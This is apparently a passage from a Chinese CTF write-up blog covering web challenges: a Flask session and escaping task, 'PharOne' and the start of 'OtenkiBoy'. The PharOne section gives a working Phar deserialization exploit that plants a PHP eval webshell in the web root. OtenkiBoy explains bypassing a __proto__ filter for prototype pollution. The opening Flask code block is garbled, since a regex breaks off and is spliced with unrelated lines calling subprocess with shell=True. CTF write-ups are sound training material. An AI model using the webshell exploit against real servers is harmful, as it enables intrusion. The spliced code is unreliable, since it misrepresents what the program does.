render_template_string</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> config <span class=\"token keyword\">import</span> secret_key</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>app<span class=\"token punctuation\">.</span>secret_key <span class=\"token operator\">=</span> secret_key</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">hello_world</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># put application's code here</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'index.html'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/cancanneed\"</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">cancanneed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    all_filename <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span><span class=\"token string\">'./static/img/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    filename <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> filename<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'img.html'</span><span class=\"token punctuation\">,</span> filename<span class=\"token operator\">=</span>filename<span class=\"token punctuation\">,</span> all_filename<span class=\"token operator\">=</span>all_filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span><span class=\"token string\">'./static/img/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> &lt;br> &lt;a href=\\\"/cancanneed?file=1.jpg\\\">/cancanneed?file=1.jpg&lt;/a>\"</span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/download\"</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">download</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    filename <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">if</span> filename<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        filename <span class=\"token operator\">=</span> filename<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'../'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        filename <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token string\">'static/img/'</span><span class=\"token punctuation\">,</span> filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"start\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">return</span> send_file<span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            abort<span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        abort<span class=\"token punctuation\">(</span><span class=\"token number\">404</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/backdoor'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">backdoor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            session<span class=\"token punctuation\">[</span><span class=\"token string\">'user'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"guest\"</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        name <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">if</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>                r'__<span class=\"token operator\">|</span><span class=\"token operator\">&lt;</span>!<span class=\"token operator\">-</span><span class=\"token operator\">-</span>swig￼<span class=\"token number\">0</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span>\\<span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>secret_key<span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>session_data <span class=\"token operator\">=</span> subprocess<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">,</span> shell<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这道题目的坑就在于如何处理 '\\' 和双引号，转义字符很好理解，由于要运行两次 python 代码，所以需要四个，而双引号有两种转义方式，一种是 \\\\\\&quot;，另一种是 \\&quot;\\&quot;。<br />\n在编程语言中，双引号（&quot;）通常用来表示字符串。在这种情况下，如果你需要在字符串中包含双引号本身，你需要对其进行转义，以告诉解释器这是一个普通字符而不是字符串的结束标志。在大部分编程语言中，使用双引号来表示字符串时，如果你想要在字符串中包含一个双引号字符，你需要使用转义字符（\\）来转义它，即使用双引号对其进行转义，让解释器知道这是一个字符而不是字符串的结束。</p>\n<p>在一些特定的情况下，比如构造 payload 用于利用漏洞或者在某些环境中执行代码时，需要特定格式的字符串。这可能需要多重转义，以确保最终的字符串在被解释执行时能够得到正确的解析。</p>\n<p>因此，两个双引号（&quot;&quot;）的出现可能是为了在字符串中包含一个双引号字符，并且确保它在最终被解释执行时被视为普通字符而不是字符串的结束。</p>\n<p>假设我们有一个字符串，要在其中包含双引号，并将其打印出来。在大多数编程语言中，如果我们想要打印  <code>&quot;Hello, &quot;World&quot;</code>  这个字符串，但我们并不想让双引号被解释为字符串的结束符，而是要作为字符串的一部分。在这种情况下，我们需要对双引号进行转义。</p>\n<p>在 Python 中的示例：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pythonCopy code<span class=\"token comment\"># 我们想要打印的字符串包含了双引号</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>my_string <span class=\"token operator\">=</span> <span class=\"token string\">\"\\\"Hello, \\\\\\\"World\\\\\\\"\\\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 将字符串打印出来</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>my_string<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这个例子中， <code>my_string</code>  变量中包含了双引号，并使用了另一个双引号进行转义。如果我们直接使用  <code>&quot;Hello, &quot;World&quot;&quot;</code>  这种写法，Python 解释器会将第一个双引号解释为字符串开始，然后  <code>Hello, </code> 作为字符串内容，而在碰到第二个双引号时会将其解释为字符串的结束，导致语法错误。通过使用双引号进行转义，Python 解释器知道第二个双引号不是用于结束字符串，而是作为字符串的一部分。</p>\n<p>将伪造的 session 传入即可，然后下面是官方 wp：</p>\n<p>它的解法和我的区别就是在绕过。上，它是使用 attr 来绕过</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaGltby5pbS9kb2NzL2dYcW1kVnZiT0VzWHBvM28vcmVhZA==\">https://shimo.im/docs/gXqmdVvbOEsXpo3o/read</span></p>\n<p>这里再说下这种写法：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">string_to_octal_ascii</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    octal_ascii <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">for</span> char <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        char_code <span class=\"token operator\">=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        octal_ascii <span class=\"token operator\">+=</span> <span class=\"token string\">\"\\\\\\\\\"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>char_code<span class=\"token punctuation\">,</span> <span class=\"token string\">'03o'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\"># octal_ascii += \"\\\\\\\\\" + format(char_code, 'o')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span> octal_ascii</pre></td></tr></table></figure><p>这种写法是 Python 中字符串格式化的一种方式，它使用了  <code>format()</code>  方法来将数值转换为指定格式的字符串。</p>\n<p>在这个例子中， <code>format(char_code, '03o')</code>  的含义如下：</p>\n<ul>\n<li><code>char_code</code>  是一个整数变量，可能是字符的 Unicode 编码值。</li>\n<li><code>'03o'</code>  是格式化字符串的格式说明符。</li>\n<li><code>o</code>  表示将整数转换为八进制形式。</li>\n<li><code>03</code>  表示生成的八进制字符串最少包含 3 位数字。如果不足 3 位，则在左侧用零进行填充。</li>\n</ul>\n<p>举个例子，如果  <code>char_code</code>  的值为 97（对应小写字母 'a' 的 Unicode 编码值），使用  <code>'03o'</code>  格式化后，就会生成字符串  <code>'141'</code> 。其中  <code>1</code>  代表八进制中的数值 1，而前面的  <code>14</code>  则是将 97 转换为八进制后得到的结果。这个格式化操作确保了生成的八进制字符串至少包含 3 位数字。</p>\n<p>涨姿势了......</p>\n<h3 id=\"pharone\"><a class=\"anchor\" href=\"#pharone\">#</a> PharOne</h3>\n<p>一道简单的文件上传 + phar 反序列化。</p>\n<p>进入界面是一个文件上传界面，查看源码发现 class.php 文件，访问看到：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Flag</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        @<span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>@<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>题目对__HALT_COMPILER () 进行了过滤，可以使用 gzip 等压缩进行绕过，Phar 反序列化的一个小技巧，其次考点在于恶意类中的命令执行函数是无回显的，不过 Web 根目录可写，可以直接写一个 WebShell 进去，其他方法也是可以的。</p>\n<p>Phar 反序列化 Exp：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Flag</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"echo \\\"&lt;?=@eval(\\\\\\$_POST['a']);\\\">/var/www/html/1.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 删除现有的 1.phar 文件，以便重新创建</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>@<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 创建一个 Phar 对象，并设置一些参数</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"__HALT_COMPILER(); ?>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 设置存根代码，停止 PHP 解析</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Flag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$o</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将恶意代码注入到 Phar 文件的元数据中</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 向 Phar 文件添加一个文件</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 停止 Phar 缓冲</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">// 调用系统命令，将 1.phar 文件压缩成 gzip 格式</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"gzip 1.phar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">// 将压缩后的 1.phar 文件重命名为 1.jpg</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token function\">rename</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1.phar.gz\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"1.jpg\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>上传后提示保存至 upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg</p>\n<p>执行</p>\n<p>file=phar://upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg</p>\n<p>然后再访问 1.php，用蚁剑连接即可。</p>\n<h3 id=\"otenkiboy\"><a class=\"anchor\" href=\"#otenkiboy\">#</a> OtenkiBoy</h3>\n<p>挺难的，这里直接用官方 wp:</p>\n<p>查看 routes/submit.js，注意到下面的片段</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> result <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">insert2db</span><span class=\"token punctuation\">(</span><span class=\"token function\">mergeJSON</span><span class=\"token punctuation\">(</span><span class=\"token constant\">DEFAULT</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>其中 data 是可控的</p>\n<p>追踪 mergeJSON，在 routes/_components/utils.js 中</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">mergeJSON</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">target<span class=\"token punctuation\">,</span> patch<span class=\"token punctuation\">,</span> deep <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> patch <span class=\"token operator\">!==</span> <span class=\"token string\">\"object\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> patch<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Array<span class=\"token punctuation\">.</span><span class=\"token function\">isArray</span><span class=\"token punctuation\">(</span>patch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> patch<span class=\"token punctuation\">;</span> <span class=\"token comment\">// do not recurse into arrays</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>target<span class=\"token punctuation\">)</span> target <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>deep<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> target <span class=\"token operator\">=</span> <span class=\"token function\">copyJSON</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> patch <span class=\"token operator\">=</span> <span class=\"token function\">copyJSON</span><span class=\"token punctuation\">(</span>patch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> key <span class=\"token keyword\">in</span> patch<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>key <span class=\"token operator\">===</span> <span class=\"token string\">\"__proto__\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">!==</span> patch<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">mergeJSON</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> patch<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> target<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>发现过滤了__proto__，我们可以使用 constructor.prototype 去代替__proto__进行原型链污染</p>\n<p>接下来是寻找注入点，查看 routes/info.js</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">timestamp</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    timestamp <span class=\"token operator\">=</span> <span class=\"token keyword\">typeof</span> timestamp <span class=\"token operator\">===</span> <span class=\"token string\">\"number\"</span> <span class=\"token operator\">?</span> timestamp <span class=\"token operator\">:</span> Date<span class=\"token punctuation\">.</span><span class=\"token function\">now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">// Remove test data from before the movie was released</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">let</span> minTimestamp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        minTimestamp <span class=\"token operator\">=</span> <span class=\"token function\">createDate</span><span class=\"token punctuation\">(</span><span class=\"token constant\">CONFIG</span><span class=\"token punctuation\">.</span>min_public_time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>Number<span class=\"token punctuation\">.</span><span class=\"token function\">isSafeInteger</span><span class=\"token punctuation\">(</span>minTimestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid configuration min_public_time.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span 